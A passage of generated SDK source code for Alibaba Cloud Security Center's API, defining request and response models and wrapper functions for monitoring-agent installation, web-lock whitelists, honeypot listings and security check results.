  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers on which you want to install the CloudMonitor agent. Separate multiple UUIDs with commas (,).'),
}

model InstallCloudMonitorResponseBody = {
  code?: string(name='Code', description='The error code returned if the request fails.', example='IllegalParam'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='400'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F92AFB96-FACC-57E7-928E-678D04B94CAE'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
}

model InstallCloudMonitorResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallCloudMonitorResponseBody(name='body'),
}

/**
  * >  Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
  *
  * @param request InstallCloudMonitorRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return InstallCloudMonitorResponse
 */
async function installCloudMonitorWithOptions(request: InstallCloudMonitorRequest, runtime: Util.RuntimeOptions): InstallCloudMonitorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.agentAccessKey)) {
    query['AgentAccessKey'] = request.agentAccessKey;
  }
  if (!Util.isUnset(request.agentSecretKey)) {
    query['AgentSecretKey'] = request.agentSecretKey;
  }
  if (!Util.isUnset(request.argusVersion)) {
    query['ArgusVersion'] = request.argusVersion;
  }
  if (!Util.isUnset(request.instanceIdList)) {
    query['InstanceIdList'] = request.instanceIdList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallCloudMonitor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * >  Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
  *
  * @param request InstallCloudMonitorRequest
  * @return InstallCloudMonitorResponse
 */
async function installCloudMonitor(request: InstallCloudMonitorRequest): InstallCloudMonitorResponse {
  var runtime = new Util.RuntimeOptions{};
  return installCloudMonitorWithOptions(request, runtime);
}

model InstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', example='123'),
}

model InstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', example='53ACA55D-0325-5056-A72D-D0EC0B9C****'),
}

model InstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallUniBackupAgentResponseBody(name='body'),
}

async function installUniBackupAgentWithOptions(request: InstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): InstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installUniBackupAgent(request: InstallUniBackupAgentRequest): InstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installUniBackupAgentWithOptions(request, runtime);
}

model JoinWebLockProcessWhiteListRequest {
  processPaths?: [ string ](name='ProcessPaths'),
  uuids?: string(name='Uuids'),
}

model JoinWebLockProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId'),
}

model JoinWebLockProcessWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: JoinWebLockProcessWhiteListResponseBody(name='body'),
}

async function joinWebLockProcessWhiteListWithOptions(request: JoinWebLockProcessWhiteListRequest, runtime: Util.RuntimeOptions): JoinWebLockProcessWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.processPaths)) {
    query['ProcessPaths'] = request.processPaths;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'JoinWebLockProcessWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function joinWebLockProcessWhiteList(request: JoinWebLockProcessWhiteListRequest): JoinWebLockProcessWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return joinWebLockProcessWhiteListWithOptions(request, runtime);
}

model ListAvailableHoneypotRequest {
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot is deployed.', example='4341018b-8e01-43f6-b1d2-af29a2a4****'),
}

model ListAvailableHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images that are used for the honeypot.', example='22'),
  data?: [ 
    {
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image that is used for the honeypot.', example='RuoYi'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image that is used for the honeypot.', example='sha256:007095d6de9c7a343e9fc1f74a7efc9c5de9d5454789d2fa505a1b3fc62****'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='ruoyi'),
      honeypotImageType?: string(name='HoneypotImageType', description='The type of the image that is used for the honeypot.', example='Web'),
      honeypotImageVersion?: string(name='HoneypotImageVersion', description='The version of the image that is used for the honeypot.', example='1.0.2'),
      multiports?: string(name='Multiports', description='The port that is supported by the honeypot. The value is in the JSON format. The value contains the following fields:

*   **log_type**: the log type
*   **proto**: the supported protocol
*   **description**: the description
*   **ports**: the supported ports
*   **port_str**: the supported port number of the string type
*   **type**: the type', example='[{"log_type":"web","proto":"tcp","description":"webServerPort","ports":[80.0],"port_str":"80","type":"web"}]'),
      proto?: string(name='Proto', description='The protocol that is supported by the honeypot.', example='tcp'),
      servicePort?: string(name='ServicePort', description='The service port of the honeypot.', example='27017.0'),
      template?: string(name='Template', description='The configuration template of the honeypot.', example='{}'),
    }
  ](name='Data', description='An array consisting of the information about the images that are used for the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6C24D883-984D-52FD-BB66-5F89F86E4837'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListAvailableHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAvailableHoneypotResponseBody(name='body'),
}

async function listAvailableHoneypotWithOptions(request: ListAvailableHoneypotRequest, runtime: Util.RuntimeOptions): ListAvailableHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAvailableHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listAvailableHoneypot(request: ListAvailableHoneypotRequest): ListAvailableHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAvailableHoneypotWithOptions(request, runtime);
}

model ListCheckInstanceResultRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='23'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  instanceIdKey?: string(name='InstanceIdKey', description='The instance ID of the check item.', example='i-uf64w4q6p9jti5gl****'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of cloud services.'),
  instanceNameKey?: string(name='InstanceNameKey', description='The instance name of the check item.', example='i-uf64w4q6p9jti5gl****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  regionIdKey?: string(name='RegionIdKey', description='The region ID of the instance.', example='cn-qingdao'),
  sortTypes?: [ string ](name='SortTypes', description='The type of the condition based on which the check items are sorted. Set the value to **STATUS**.'),
  statuses?: [ string ](name='Statuses', description='The statuses of check items.'),
}

model ListCheckInstanceResultResponseBody = {
  basicData?: [ 
    {
      id?: long(name='Id', description='The ID of the check result for the instance.', example='300054'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='rm-m5es7ch1s62i4****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sg-t4nbk2aodzio52xv****'),
      regionId?: string(name='RegionId', description='The region ID of the instance.', example='ap-southeast-1'),
      status?: string(name='Status', description='The statuses of check items. Multiple statuses are separated by commas (,). Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**', example='NOT_PASS'),
    }
  ](name='BasicData', description='An array that consists of the basic information about the instances.'),
  checks?: [ map[string]any ](name='Checks', description='The extended information about the instances.', example='[{
	"SecurityGroupNameShow": {
		"value": "Sas_Malicious_Ip_Security_Group"
	},
	"InstanceIdShow": {
		"link": "https://ecs.console.aliyun.com/#/securityGroupDetail/region/ap-southeast-1/groupId/sg-t4nbk2aodzio52xvj00s/rule/intranetIngress",
		"value": "sg-t4nbk2aodzio52xv****"
	}
}]'),
  columns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
          showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
          type?: string(name='Type', description='The format of the check results for the instances. Valid values:

*   **text**
*   **link**', example='text'),
        }
      ](name='Grids', description='The metadata information about the details of the instances.'),
      key?: string(name='Key', description='The search condition.', example='RegionIdShow'),
      search?: boolean(name='Search', description='Indicates whether the search condition is used. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      searchKey?: string(name='SearchKey', description='The value of the search condition.', example='InstanceIdKey'),
      showName?: string(name='ShowName', description='The display name of the search condition.', example='Region'),
      type?: string(name='Type', description='The format of the check results for the instances. Valid values:

*   **text**
*   **link**', example='text'),
    }
  ](name='Columns', description='The metadata information about the search conditions that can be used to filter instances.'),
  pageInfo?: {
    count?: string(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3AB18264-8A1B-52A6-A9AF-A886556E0F2E'),
}

model ListCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckInstanceResultResponseBody(name='body'),
}

async function listCheckInstanceResultWithOptions(request: ListCheckInstanceResultRequest, runtime: Util.RuntimeOptions): ListCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIdKey)) {
    query['InstanceIdKey'] = request.instanceIdKey;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceNameKey)) {
    query['InstanceNameKey'] = request.instanceNameKey;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdKey)) {
    query['RegionIdKey'] = request.regionIdKey;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckInstanceResult(request: ListCheckInstanceResultRequest): ListCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckInstanceResultWithOptions(request, runtime);
}

model ListCheckItemWarningMachineRequest {
  checkId?: long(name='CheckId', example='8'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='ce89cdd0ea732472a8703821b19e****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  groupId?: long(name='GroupId', example='1161****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  remark?: string(name='Remark', example='225'),
  riskType?: string(name='RiskType', example='hc_best_secruity'),
  status?: int32(name='Status', example='3'),
}

model ListCheckItemWarningMachineResponseBody = {
  list?: [ 
    {
      authVersion?: int32(name='AuthVersion', example='3'),
      bind?: boolean(name='Bind', example='true'),
      fixList?: [ 
        {
          riskId?: long(name='RiskId', example='105'),
          riskName?: string(name='RiskName'),
        }
      ](name='FixList'),
      instanceId?: string(name='InstanceId', example='i-bp1a69mvjujbakxu****'),
      instanceName?: string(name='InstanceName', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      portOpen?: boolean(name='PortOpen', example='true'),
      prompt?: string(name='Prompt'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      status?: int32(name='Status', example='1'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      warningRiskList?: [ 
        {
          riskId?: long(name='RiskId', example='105'),
          riskName?: string(name='RiskName'),
        }
      ](name='WarningRiskList'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='107'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='22B5615F-700E-575A-A6D5-DC8D7741****'),
}

model ListCheckItemWarningMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningMachineResponseBody(name='body'),
}

async function listCheckItemWarningMachineWithOptions(request: ListCheckItemWarningMachineRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningMachine(request: ListCheckItemWarningMachineRequest): ListCheckItemWarningMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningMachineWithOptions(request, runtime);
}

model ListCheckItemWarningSummaryRequest {
  checkItemFuzzy?: string(name='CheckItemFuzzy', example='password'),
  checkLevel?: string(name='CheckLevel', example='medium'),
  checkType?: string(name='CheckType', example='hc.check.type.attack_defense'),
  checkWarningStatus?: int32(name='CheckWarningStatus', example='3'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='c471f0f61b9c04f8380556e922cf1****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  groupId?: long(name='GroupId', example='1161****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  riskType?: string(name='RiskType', example='hc_best_secruity'),
}

model ListCheckItemWarningSummaryResponseBody = {
  list?: [ 
    {
      advice?: string(name='Advice', example='In the Administrative Tools window, double-click Local Security Policy. In the Local Security Policy window that appears, choose Security Settings\\\\Local Policies\\\\Audit Policy, configure all audit policies as: `Success, Failure`.'),
      alias?: string(name='Alias', example='week_pa****'),
      checkId?: long(name='CheckId', example='696'),
      checkItem?: string(name='CheckItem', example='Config the Event Audit policys'),
      checkLevel?: string(name='CheckLevel', example='high'),
      checkType?: string(name='CheckType', example='Security audit'),
      description?: string(name='Description', example='Config the Event Audit policys'),
      riskType?: string(name='RiskType', example='hc_best_secruity'),
      status?: int32(name='Status', example='1'),
      warningMachineCount?: int32(name='WarningMachineCount', example='20'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='149'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='DC97C9EC-4B7D-5EFF-8A5E-A5CCC9ED****'),
}

model ListCheckItemWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningSummaryResponseBody(name='body'),
}

async function listCheckItemWarningSummaryWithOptions(request: ListCheckItemWarningSummaryRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkItemFuzzy)) {
    query['CheckItemFuzzy'] = request.checkItemFuzzy;
  }
  if (!Util.isUnset(request.checkLevel)) {
    query['CheckLevel'] = request.checkLevel;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.checkWarningStatus)) {
    query['CheckWarningStatus'] = request.checkWarningStatus;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningSummary(request: ListCheckItemWarningSummaryRequest): ListCheckItemWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningSummaryWithOptions(request, runtime);
}

model ListCheckResultRequest {
  checkKey?: string(name='CheckKey', description='The key that you want to use to search for check items in fuzzy match mode.', example='OSS'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset types of cloud services. Valid values:

*   **ECS**: Elastic Compute Service (ECS)
*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis (Redis)
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: Apsara File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='50'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of requirement items.'),
  riskLevels?: [ string ](name='RiskLevels', description='The severities of check items. Separate multiple severities with commas (,). Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which check items are sorted. Valid values:

*   **RISK_LEVEL**: risk level
*   **STATUS**: state'),
  standardIds?: [ long ](name='StandardIds', description='The IDs of standards.'),
  statuses?: [ string ](name='Statuses', description='The states of check items. Separate multiple states with commas (,). Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers. Valid values:

*   **ALIYUN**: Alibaba Cloud'),
}

model ListCheckResultResponseBody = {
  checks?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='5'),
      checkPolicies?: [ 
        {
          requirementId?: long(name='RequirementId', description='The requirement item ID of the check item.', example='2'),
          requirementShowName?: string(name='RequirementShowName', description='The item display name of the check item.', example='Alibaba cloud OSS best security practices'),
          sectionId?: long(name='SectionId', description='The section ID of the check item.', example='3'),
          sectionShowName?: string(name='SectionShowName', description='The section display name of the check item.', example='Log Audit'),
          standardId?: long(name='StandardId', description='The standard ID of the check item.', example='1'),
          standardShowName?: string(name='StandardShowName', description='The standard display name of the check item.', example='Best security practices'),
        }
      ](name='CheckPolicies', description='The check policies.'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='OSS-PublicReadOpenManifestFileWithoutEncryption'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid values:

*   If the **InstanceType** parameter is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If the **InstanceType** parameter is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If the **InstanceType** parameter is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If the **InstanceType** parameter is set to **WAF**, this parameter supports the following valid values:

    *   **DOMAIN**

*   If the **InstanceType** parameter is set to other values, this parameter supports the following valid values:

    *   **INSTANCE**', example='DISK'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid values:

*   **ECS**: ECS
*   **SLB**: SLB
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: MongoDB
*   **KVSTORE**: Redis
*   **ACR**: Container Registry
*   **CSK**: ACK
*   **VPC**: VPC
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: CDN
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: RAM
*   **DDOS**: Anti-DDoS
*   **WAF**: WAF
*   **OSS**: OSS
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: MSE
*   **NAS**: NAS
*   **SDDP**: SDDP
*   **EIP**: EIP', example='ECS'),
      lastCheckTime?: long(name='LastCheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1657793398000'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      status?: string(name='Status', description='The state of the check item. Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**', example='PASS'),
      taskId?: string(name='TaskId', description='The ID of the check task.', example='64'),
      trialPermission?: boolean(name='TrialPermission', description='The flag that whether this check item needs trial permission.', example='true'),
      vendor?: string(name='Vendor', description='The value of the cloud service provider.', example='ALIYUN'),
      vendorShowName?: string(name='VendorShowName', description='The name of the cloud service provider.', example='Aliyun'),
    }
  ](name='Checks', description='An array that consists of the check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F9B6DD67-B289-5406-B35C-B0F4A217S23'),
}

model ListCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckResultResponseBody(name='body'),
}

async function listCheckResultWithOptions(request: ListCheckResultRequest, runtime: Util.RuntimeOptions): ListCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkKey)) {
    query['CheckKey'] = request.checkKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckResult(request: ListCheckResultRequest): ListCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckResultWithOptions(request, runtime);
}

model ListCheckStandardRequest {
  instanceIds?: [ string ](name='InstanceIds'),
  instanceSubTypes?: [ string ](name='InstanceSubTypes'),
  instanceTypes?: [ string ](name='InstanceTypes'),
  lang?: string(name='Lang', example='zh'),
  vendors?: [ string ](name='Vendors'),
}

model ListCheckStandardResponseBody = {
  requestId?: string(name='RequestId', example='FA91FBDA-***'),
  standards?: [ 
    {
      id?: long(name='Id', example='1'),
      requirements?: [ 
        {
          id?: long(name='Id', example='11'),
          riskCheckCount?: long(name='RiskCheckCount', example='10'),
          showName?: string(name='ShowName'),
        }
      ](name='Requirements'),
      showName?: string(name='ShowName'),
      type?: string(name='Type', example='IDENTITY_PERMISSION'),
    }
  ](name='Standards'),
}

model ListCheckStandardResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckStandardResponseBody(name='body'),
}

async function listCheckStandardWithOptions(request: ListCheckStandardRequest, runtime: Util.RuntimeOptions): ListCheckStandardResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceSubTypes)) {
    query['InstanceSubTypes'] = request.instanceSubTypes;
  }
  if (!Util.isUnset(request.instanceTypes)) {
    query['InstanceTypes'] = request.instanceTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
